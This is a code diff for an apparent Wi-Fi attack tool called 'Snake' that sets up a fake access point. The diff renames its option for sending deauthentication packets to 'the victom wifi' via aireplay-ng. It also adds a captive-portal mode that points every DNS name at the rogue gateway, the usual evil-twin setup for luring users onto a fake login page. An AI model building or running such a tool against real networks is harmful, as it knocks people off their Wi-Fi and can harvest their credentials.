@@ -6,7 +6,7 @@ import time
 import subprocess
 from subprocess import PIPE
 import argparse
-from Snake_Package.Death_wifi import *
+from Snake_Package.Deauth_wifi import Deauth_Router
 
 if os.geteuid() != 0 :
    print("\n[+] Run as root or sudo ")
@@ -21,7 +21,7 @@ class Fake_access_point:
      
       def __init__(self):
           self.args_Control()
-          if self.args.Death:
+          if self.args.Deauth :
              os.system(" sudo iw dev wlan0 interface add wlansnake type station")  #sudo iw dev Sanke1 del 
              print("\n[+] Snake add wlansnake intafeface wifi ....|| ")
           else:
@@ -86,7 +86,9 @@ class Fake_access_point:
               os.system(group)           
       def Create_dns_masq(self):
               with open(os.path.dirname(__file__)+"/Snake_config/dnsmasq.conf",'w') as dnsmasq:
+                    
                    dnsmasq.write(
+                                   'no-resolv'+'\n'\
                                    'interface='+f'{self.args.Interface}'+'mon'+'\n'\
                                    "dhcp-range=192.168.1.2, 192.168.1.30,255.255.255.0, 12h"+'\n'\
                                    "dhcp-option=3, 192.168.1.1"+'\n'\
@@ -96,6 +98,9 @@ class Fake_access_point:
                                    "log-dhcp"+"\n"\
                                    "listen-address= 127.0.0.1"+'\n'                                
                                 )  
+              if self.args.Portal:
+                      with open(os.path.dirname(__file__)+"/Snake_config/dnsmasq.conf",'a') as dnsmasq :
+                                      dnsmasq.write("address=/#/192.168.1.1"+"\n")   
               group  = "chown "+ user_name+ ":"+user_name +" "+ os.path.dirname(__file__)+"/Snake_config/dnsmasq.conf" 
               os.system(group) 
       def Start_InterFace(self):
@@ -135,16 +140,20 @@ class Fake_access_point:
              command_proc2 = ' gnome-terminal  -e ' +'"' + order2 +'"'               
              call_termminal = subprocess.call(command_proc2,shell=True,stderr=subprocess.PIPE)
              
-             if self.args.Death:                                
-                 run = Death_Router()  
+             if self.args.Deauth :                                
+                 run = Deauth_Router()  
              else:
                   pass 
+             if self.args.Portal:
+                from Snake_Package.Captive_Portal import Captive_Portal
+                run = Captive_Portal()
       def args_Control(self):
             parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")
-            parser.add_argument( '-I ',"--Interface" ,metavar='' , action=None,required = True ,help="Interface act AP 'Support AP Mode'" )               
-            parser.add_argument( '-S ',"--show", action='store_true' ,help="Show all access point around you [bssid-ssid-channel-sagenal]" )
+            parser.add_argument( '-I  ',"--Interface" ,metavar='' , action=None,required = True ,help="Interface act AP 'Support AP Mode'" )               
+            parser.add_argument( '-S  ',"--show", action='store_true' ,help="Show all access point around you [bssid-ssid-channel-sagenal]" )
             parser.add_argument( '-AP ',"--APName" ,metavar='' , action=None ,help = "Name of access point [ if not set the name option Defualit name is 'Free-wifi']")
-            parser.add_argument( '-D ',"--Death" ,metavar='' , action=None ,help = "Name of access point [ if not set the name option Defualit name is 'Free-wifi']")
+            parser.add_argument( '-D  ',"--Deauth" ,metavar='' , action=None ,help = "send Deauth packet to the victom wifi [ airepay-ng ] ")
+            parser.add_argument( '-CP ',"--Portal", action='store_true'  ,help = "set service wifi login page  [Captive_Portal]")
             self.args = parser.parse_args()
             if len(sys.argv)> 1 :
                  pass
